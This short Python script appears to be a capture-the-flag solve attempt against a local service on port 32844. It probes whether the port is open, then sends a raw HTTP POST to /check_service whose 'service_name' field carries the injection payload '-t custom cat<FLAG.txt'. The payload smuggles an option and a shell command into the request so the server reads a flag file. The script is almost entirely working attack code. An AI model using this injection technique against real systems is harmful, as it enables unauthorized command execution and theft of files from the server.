import sys
import socket

print("Python version:", sys.version)
print("\nTesting socket connectivity...")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex(('127.0.0.1', 32844))
    if result == 0:
        print("Port 32844 is OPEN")
        sock.close()
    else:
        print(f"Port 32844 is CLOSED (error code: {result})")
except Exception as e:
    print(f"Socket test failed: {type(e).__name__}: {e}")

print("\nAttempting raw HTTP request...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(('127.0.0.1', 32844))
    
    request = b'POST /check_service HTTP/1.1\r\nHost: 127.0.0.1:32844\r\nContent-Type: application/json\r\nContent-Length: 50\r\n\r\n{"service_name": "-t custom cat<FLAG.txt"}'
    
    sock.sendall(request)
    response = sock.recv(4096)
    print("Response received:")
    print(response.decode('utf-8', errors='ignore'))
    sock.close()
except Exception as e:
    print(f"Raw HTTP failed: {type(e).__name__}: {e}")

